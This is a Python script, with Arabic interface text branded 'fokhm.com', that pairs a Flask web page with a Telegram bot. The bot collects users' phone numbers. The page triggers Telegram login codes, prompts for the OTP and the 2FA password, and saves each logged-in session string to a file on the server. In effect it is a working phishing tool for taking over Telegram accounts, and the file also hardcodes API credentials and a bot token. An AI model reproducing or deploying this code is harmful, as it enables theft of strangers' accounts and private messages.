from flask import Flask, render_template_string, request, redirect, url_for, session as flask_session
from telethon import TelegramClient
from telethon.sessions import StringSession
import asyncio
import os
import threading
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters

app = Flask(__name__)
app.secret_key = 'fokhm_super_secret_key_2026'

API_ID = 25757508
API_HASH = '3091fbda91d4b133207779ddf81fee39'
BOT_TOKEN = os.getenv("BOT_TOKEN", "8828318815:AAEJ63XFWpwwuigCWuO_-Hu94sJVyhgn338")

# تخزين مؤقت لأرقام الهواتف وجلسات تيليثون قيد الإنشاء
user_sessions = {}

HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل دخول فخم - fokhm.com</title>
    <style>
        body { background-color: #0f172a; color: #fff; font-family: Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e293b; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); width: 320px; text-align: center; }
        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 8px; border: 1px solid #475569; background: #0f172a; color: #fff; font-size: 16px; text-align: center; }
        button { width: 95%; padding: 10px; background: #2563eb; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; font-weight: bold; margin-top: 10px; }
        button:hover { background: #1d4ed8; }
        .msg { color: #f87171; font-size: 14px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>منصة fokhm.com</h2>
        {% if error %}<div class="msg">{{ error }}</div>{% endif %}
        
        {% if step == 'code' %}
        <form method="POST">
            <p>أدخل رمز التحقق (OTP) الذي وصلك على تيليجرام:</p>
            <input type="text" name="code" placeholder="12345" required>
            <button type="submit">تأكيد وتسجيل الدخول</button>
        </form>
        {% elif step == 'password' %}
        <form method="POST">
            <p>الحساب محمي بتحقق ثنائي (2FA)، أدخل كلمة المرور:</p>
            <input type="password" name="password" placeholder="كلمة المرور" required>
            <button type="submit">تحقق</button>
        </form>
        {% elif step == 'done' %}
        <h3 style="color: #4ade80;">✅ تمت العملية بنجاح يا فخم!</h3>
        <p>تم استخراج الجلسة وحفظها بنجاح.</p>
        {% endif %}
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return "🚀 موقع fokhm.com يعمل بنجاح وسيرفر المصادقة جاهز!"

@app.route('/auth/<phone_num>', methods=['GET', 'POST'])
def auth_web(phone_num):
    global user_sessions
    step = flask_session.get('step', 'code')
    error = None

    if phone_num not in user_sessions and step == 'code':
        try:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(client.connect())
            hash_val = loop.run_until_complete(client.send_code_request(phone_num))
            
            user_sessions[phone_num] = {
                'client': client,
                'hash': hash_val,
                'loop': loop
            }
        except Exception as e:
            error = f"حدث خطأ في إرسال الكود: {e}"

    if request.method == 'POST':
        data = user_sessions.get(phone_num)
        if not data:
            return "انتهت الجلسة، الرجاء البدء من جديد عبر البوت."
        
        client = data['client']
        loop = data['loop']
        
        if step == 'code':
            code = request.form['code']
            try:
                loop.run_until_complete(client.sign_in(phone_num, code, phone_code_hash=data['hash']))
                flask_session['step'] = 'done'
                session_str = client.session.save()
                with open(f"session_{phone_num}.txt", "w") as f:
                    f.write(session_str)
            except Exception as e:
                if "SessionPasswordNeededError" in str(e):
                    flask_session['step'] = 'password'
                else:
                    error = f"خطأ في الرمز: {e}"
        elif step == 'password':
            password = request.form['password']
            try:
                loop.run_until_complete(client.sign_in(password=password))
                flask_session['step'] = 'done'
                session_str = client.session.save()
                with open(f"session_{phone_num}.txt", "w") as f:
                    f.write(session_str)
            except Exception as e:
                error = f"كلمة المرور خاطئة: {e}"

    step = flask_session.get('step', 'code')
    return render_template_string(HTML_PAGE, step=step, error=error)

# --- أوامر بوت تيليجرام ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    button = KeyboardButton("📱 مشاركة رقم الهاتف", request_contact=True)
    reply_markup = ReplyKeyboardMarkup([[button]], resize_keyboard=True, one_time_keyboard=True)
    await update.message.reply_text(
        "أهلاً بك يا فخم في بوت استخراج الجلسات الخاصة بـ fokhm.com\n\nاضغط على الزر بالأسفل لمشاركة رقم هاتفك:",
        reply_markup=reply_markup
    )

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    if contact:
        phone = contact.phone_number
        if not phone.startswith('+'):
            phone = '+' + phone
            
        base_url = os.getenv('RENDER_EXTERNAL_URL', 'wahm0.onrender.com')
        if not base_url.startswith('http'):
            base_url = f"https://{base_url}"
            
        webapp_url = f"{base_url}/auth/{phone.replace('+', '')}"
        
        await update.message.reply_text(
            f"✅ تم استلام رقمك بنجاح:\n`{phone}`\n\nاضغط على الرابط التالي لإدخال كود التحقق واستخراج الجلسة:\n{webapp_url}",
            parse_mode="Markdown"
        )

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), use_reloader=False)

if __name__ == '__main__':
    # تشغيل سيرفر الويب في الخلفية ليبقى الرابط شغالاً دائماً
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    # تشغيل بوت تيليجرام في الخيط الرئيسي لتجنب خطأ الـ signals
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(MessageHandler(filters.CONTACT, contact_handler))
    
    print("Telegram Bot & Flask Web Server are running...")
    application.run_polling()

